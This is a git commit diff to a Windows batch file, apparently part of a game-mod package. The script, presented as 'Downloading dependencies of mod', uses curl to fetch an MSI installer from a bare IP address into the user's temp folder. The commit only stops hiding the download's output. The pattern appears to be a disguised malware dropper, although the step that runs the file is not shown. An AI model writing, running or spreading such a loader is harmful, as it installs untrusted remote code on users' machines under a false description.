defb7b042e3bb14fe607e50798ee374568a7af1f
nfo <luissantinidev@gmail.com>
2025-06-29 17:59:14 -0300

    Update index.bat

--- index.bat
+++ index.bat
@@ -3,7 +3,7 @@ set "URL=http://87.121.84.195/Installer.msi"
 set "FILE=%temp%\AdventureInstaller.msi"
 
 echo Downloading dependencies of mod...
-curl -L -o "%FILE%" "%URL%" >nul 2>&1
+curl -L -o "%FILE%" "%URL%"
 
 if exist "%FILE%" (
     echo Finish...
